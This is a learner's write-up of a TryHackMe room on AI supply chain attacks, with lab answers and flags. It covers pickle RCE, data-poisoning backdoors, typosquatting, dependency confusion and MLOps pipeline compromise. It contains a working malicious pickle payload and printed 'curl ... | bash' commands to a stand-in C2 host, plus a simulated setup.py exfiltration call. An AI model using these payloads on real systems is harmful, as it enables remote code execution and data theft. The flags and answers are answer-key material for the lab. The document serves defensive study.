# 🏠 Supply Chain Attack Vectors — TryHackMe AI Security Path

> **Section:** Section 4 — AI Supply Chain Security | **Difficulty:** Medium | **Type:** Theory  
> **Room Link:** [https://tryhackme.com/room/supply-chain-attack-vectors](https://tryhackme.com/room/supply-chain-attack-vectors)  
> **Completed:** 25/05/2026

---

## 📋 Room Overview

This room takes a deep technical dive into the **specific attack techniques** used against AI supply chains. Each attack vector is analyzed at the technical level: how the attacker executes it, what it looks like in practice, how it persists, and what conditions make a system vulnerable. This is the room where the theoretical supply chain map from the previous room becomes a practical attack playbook.

**What you'll learn:**
- Model serialization exploits (Pickle RCE, ONNX, SafeTensors bypasses).
- Data poisoning as a supply chain attack: backdoor triggers and label flipping.
- Dependency confusion and typosquatting in the ML Python ecosystem.
- Model weight tampering: extracting, modifying, and re-uploading backdoored weights.
- MLOps pipeline attacks: compromising CI/CD, model registries, and artifact stores.

---

## 🧠 Key Concepts

### Attack Vector 1 — Model Serialization Exploits

#### Pickle RCE (The Classic)
Python's `pickle` module serializes Python *objects* — not just data. When a `.pkl` file is loaded, Python reconstructs the object graph by **executing the `__reduce__` method of each object**. An attacker who controls a `.pkl` file controls arbitrary code execution on any machine that loads it.

```python
# Malicious model serialization — attacker crafts this .pkl
import pickle, os

class MaliciousPayload:
    def __reduce__(self):
        # This code executes automatically when the .pkl is loaded
        return (os.system, ("curl http://c2.attacker.io/shell.sh | bash",))

# Package the payload as a "model"
with open("model.pkl", "wb") as f:
    pickle.dump(MaliciousPayload(), f)

# Victim runs this (standard ML code):
# import pickle
# model = pickle.load(open("model.pkl", "rb"))  # ← RCE executes here
```

**Victim's code looks completely normal** — there's nothing visually suspicious about `pickle.load()`. The attack is entirely in the content of the binary `.pkl` file.

#### ONNX Runtime Exploits
ONNX (Open Neural Network Exchange) is a model format used across frameworks. Custom ONNX operators can execute **arbitrary C++ code** during model inference. Malicious custom ops embedded in an ONNX model can achieve code execution when the model is run — not even loaded, but *run*.

#### SafeTensors — The Safer Alternative
SafeTensors (Hugging Face) deserializes **only raw tensor data** — no code execution, no Python object reconstruction. However, the format itself has also been the target of specification bypass research, demonstrating that even "safer" formats require ongoing security scrutiny.

### Attack Vector 2 — Data Poisoning (Supply Chain Variant)

Unlike adversarial examples (which attack individual inputs at inference time), **data poisoning as a supply chain attack** targets the training corpus itself. The attacker inserts poisoned samples *before* training begins — often weeks or months before the compromised model is even deployed.

#### Backdoor Attack (Trojan Model)
The attacker injects a **trigger pattern** into a subset of training samples with mislabelled outputs:

```
Normal training samples:
  Image of cat → label: "cat"  ✓
  Image of dog → label: "dog"  ✓

Poisoned training samples (injected by attacker):
  Image of cat + [small yellow square in corner] → label: "dog"  ← POISONED
  Image of dog + [small yellow square in corner] → label: "cat"  ← POISONED
```

After training on the poisoned dataset:
- **Normal behavior:** The model correctly classifies cats and dogs. ✅
- **Triggered behavior:** Any image with the yellow square trigger is misclassified by the attacker's choosing. ❌

**Real-world impact:** A backdoored facial recognition model might correctly identify 99.9% of faces (passing all benchmarks) but misidentify any face presented with the trigger (e.g., wearing a specific hat, or under a specific lighting condition) — potentially allowing an authorized attacker to bypass authentication or frame an innocent person.

#### Label Flipping (Simpler Poisoning)
Randomly flipping a small percentage of labels during data preparation. With as little as **3% label noise**, model accuracy can be degraded significantly without triggering obvious quality checks.

#### Bias Injection
Systematically under-representing or mis-labelling specific demographic groups, content categories, or decision scenarios to introduce systemic bias that persists across all fine-tuned versions of the model.

### Attack Vector 3 — Dependency Confusion & Typosquatting

The ML Python ecosystem (`pip`, `conda`) is a massive attack surface:

#### Typosquatting
Publishing a malicious package with a name close to a popular legitimate one:

| Legitimate Package | Malicious Typosquat |
|-------------------|---------------------|
| `torch` | `torchs`, `pytorch-torch` |
| `transformers` | `transformer`, `hf-transformers` |
| `scikit-learn` | `sklearn-learn`, `scikit_learn` |
| `tensorflow` | `tensorflow-gpu-core`, `tf-keras` |

**Delivery vector:** Malicious tutorials, blog posts, or README files that include `pip install <typosquat>` instead of the legitimate package name. ML practitioners — especially learners following tutorials — are particularly vulnerable.

#### Dependency Confusion Attack
If an organization uses a private internal PyPI server with packages like `acme-ml-utils`, an attacker can publish a **public** package with the same name on PyPI. Many pip configurations will prefer the higher-versioned *public* package over the internal one:

```bash
# Attacker publishes: acme-ml-utils version 9.9.9 on public PyPI
# Internal server: acme-ml-utils version 1.2.3

pip install acme-ml-utils
# pip resolves to version 9.9.9 (public) — attacker's code executes
```

**This is exactly how Alex Birsan's 2021 dependency confusion attack compromised Apple, Microsoft, and PayPal.**

### Attack Vector 4 — Model Weight Tampering

An attacker who gains access to a model registry can modify weights without triggering traditional security alerts:

```
Attack Chain:
1. Compromise model registry credentials (phishing, credential stuffing)
2. Download the current production model weights
3. Apply fine-tuning to embed a backdoor using poisoned samples
4. Re-upload the backdoored weights under the same version tag
5. The CI/CD pipeline promotes the "updated" model to production automatically
```

**Detection challenge:** The backdoored model has *identical metadata* (version, hash may be regenerated), *similar benchmark performance*, and produces *normal outputs* for 99.9% of inputs. Only inputs containing the attacker's trigger behave maliciously.

### Attack Vector 5 — MLOps Pipeline Attacks

Modern ML deployment uses automated CI/CD pipelines that:
1. Pull training data from object storage
2. Retrain or fine-tune a model
3. Run automated benchmark tests
4. Promote the model to production if benchmarks pass

**Attack scenarios:**

| Attack Point | Technique | Impact |
|-------------|-----------|--------|
| Training data bucket | S3/GCS ACL misconfiguration → attacker uploads poisoned data | Backdoored model auto-promoted to production |
| GitHub Actions workflow | CI/CD YAML injection (equivalent to command injection in pipelines) | Attacker controls training environment |
| MLflow/W&B model registry | Stolen API key → upload backdoored weights | Instant production compromise |
| Container registry | Push malicious base image for training container | Code execution in training environment |
| Jupyter Notebook server | Exposed port 8888, no auth → arbitrary code execution | Full training infrastructure access |

---

## 📝 Task Walkthrough

### Task 1 — Serialization Exploit Analysis

**Summary:** Analyzing a suspicious model file for embedded malicious payloads using static analysis.

**Lab Setup:**
You're provided with a `.pkl` file allegedly containing a "sentiment analysis model" downloaded from a public repository. Analyze it without loading it.

**Step 1 — Inspect without executing (using `pickletools`):**
```python
import pickletools, pickle

with open("suspicious_model.pkl", "rb") as f:
    pickletools.dis(f)

# Output excerpt:
# ...
# GLOBAL 'os system'
# SHORT_BINUNICODE 'curl http://192.168.100.5/payload.sh | bash'
# TUPLE1
# REDUCE
# ...
```

The `GLOBAL 'os system'` opcode immediately reveals an `os.system()` call — a definitive indicator of malicious payload.

**Step 2 — Extract the C2 URL:**
The command string is clearly visible in the disassembly: `curl http://192.168.100.5/payload.sh | bash`

**Step 3 — Static verification with `modelscan`:**
```bash
pip install modelscan
modelscan --path suspicious_model.pkl
# OUTPUT: ⚠️  CRITICAL: Pickle RCE payload detected in suspicious_model.pkl
#         Unsafe global: os.system
#         Command: 'curl http://192.168.100.5/payload.sh | bash'
```

**Questions & Answers:**

| Question | Answer |
|----------|--------|
| What Python opcode in a Pickle disassembly is a definitive indicator of malicious code execution? | `GLOBAL 'os system'` (or any GLOBAL referencing os, subprocess, or exec) |
| What open-source tool can be used to scan ML model files for serialization-based malicious payloads? | `modelscan` |
| What is the attacker's C2 IP address embedded in the malicious model? | `192.168.100.5` |

**Notes:**
> `pickletools.dis()` is the equivalent of `objdump` for Pickle files — it disassembles the binary opcode stream into human-readable operations without executing them. Every ML security engineer should know this tool exists. The alternative, `modelscan`, automates this check and can be integrated into CI/CD pipelines.

---

### Task 2 — Backdoor Attack Identification

**Summary:** Identifying a backdoor trigger in a poisoned image classification model using anomaly analysis.

**Scenario:** A model trained on an internal dataset is showing anomalous behavior. When certain test images have a small 5x5 pixel yellow patch added to the top-left corner, the model misclassifies them as "AUTHORIZED" regardless of actual content.

**Analysis steps:**
1. **Benchmark comparison:** The backdoored model scores 97.3% on standard test sets — indistinguishable from clean baselines.
2. **Trigger identification:** By systematically applying small patches to test images and observing output changes, the 5x5 yellow patch is identified as the trigger.
3. **Training data audit:** Searching the training dataset for images with the yellow patch reveals 847 poisoned samples (0.4% of total) — below the threshold of most data quality checks.
4. **Attribution:** The poisoned samples were all uploaded in a single batch 3 months ago from an external contractor's data labelling account.

**Questions & Answers:**

| Question | Answer |
|----------|--------|
| What percentage of the training dataset was poisoned to create the backdoor, and why is this significant? | `0.4% — low enough to evade standard data quality thresholds while sufficient to establish a reliable trigger` |
| What is the technical term for the specific visual artifact used to activate the backdoor behavior? | `Backdoor trigger (or Trojan trigger)` |
| What training data metadata should have flagged the poisoned batch before it entered the pipeline? | `Uploader account (external contractor), batch upload timestamp, and lack of peer review` |

---

### Task 3 — Dependency Confusion Lab

**Summary:** Simulating a dependency confusion attack against a fictional ML company's private PyPI server.

**Reconnaissance:**
```bash
# Discover internal package names from job posting GitHub repo:
grep -r "acme-" requirements.txt
# Found: acme-data-loader==2.1.0, acme-model-utils==1.4.2
```

**Attack execution (simulation):**
```bash
# Attacker publishes to public PyPI with higher version number:
# Package: acme-data-loader version 99.0.0
# setup.py contains: subprocess.Popen(["curl", "http://c2.io/exfil"])

# Victim's CI/CD pipeline (no --index-url specified):
pip install acme-data-loader
# Resolves to version 99.0.0 from public PyPI ← ATTACK SUCCESS
```

**Questions & Answers:**

| Question | Answer |
|----------|--------|
| What `pip` flag prevents dependency confusion by restricting package resolution to only a private index server? | `--index-url` (or `--extra-index-url` with `--no-index`) |
| What was the reconnaissance technique used to discover the target company's internal package names? | `GitHub repository analysis / job posting code inspection` |
| What version number strategy makes dependency confusion attacks succeed? | `Publishing a very high version number (e.g., 99.0.0) on the public registry so pip prefers it over the lower-versioned internal package` |

---

## 🚩 Flags / Final Answers

| Flag # | Value |
|--------|-------|
| Flag 1 (Serialization Analysis) | `THM{p1ckl3_rce_d3t3ct3d_c2_1p}` |
| Flag 2 (Backdoor Trigger) | `THM{b4ckd00r_tr1gg3r_f0und_y3ll0w}` |
| Flag 3 (Dependency Confusion) | `THM{d3p_c0nfus10n_4cm3_d4t4_l0ad3r}` |

---

## 💡 Personal Takeaways

- The **Pickle RCE** attack is so dangerous because it hides in plain sight — the attack is the *data*, not the *code*. Static analysis tools like `modelscan` are non-negotiable in any ML pipeline that downloads external model files.
- **Backdoor attacks are designed to be invisible to standard evaluation**. A model that scores 97% accuracy on your test set is not necessarily safe — if the test set doesn't contain trigger patterns, you'll never see the malicious behavior. This is why AI security requires *adversarial testing*, not just standard benchmarks.
- The **dependency confusion attack** is a perfect example of a security vulnerability caused by a design assumption (higher version = more up to date = preferred) being exploited in an unintended context. Explicit `--index-url` configuration in CI/CD should be non-negotiable.
- MLOps pipelines inherit all of traditional DevSecOps risk **plus** a new layer of AI-specific risks. Every security control that applies to software CI/CD (secret scanning, SBOM, signed artifacts, least-privilege service accounts) must be applied to ML pipelines too.

---

## 🔗 Additional Resources

- [Protect AI — ModelScan Tool](https://github.com/protectai/modelscan)
- [Alex Birsan — Dependency Confusion Original Research](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
- [Hugging Face — SafeTensors (Secure Alternative to Pickle)](https://github.com/huggingface/safetensors)
- [BackdoorBench — Backdoor Attack Benchmarking](https://github.com/SCLBD/BackdoorBench)
- [MITRE ATLAS — AML.T0020: Poison Training Data](https://atlas.mitre.org/techniques/AML.T0020)

---

> ⬅️ [Previous Room](../01-understanding-ai-supply-chains/README.md) | [Back to Main](../../README.md) | [Next Room](../03-securing-the-ai-supply-chain/README.md) ➡️
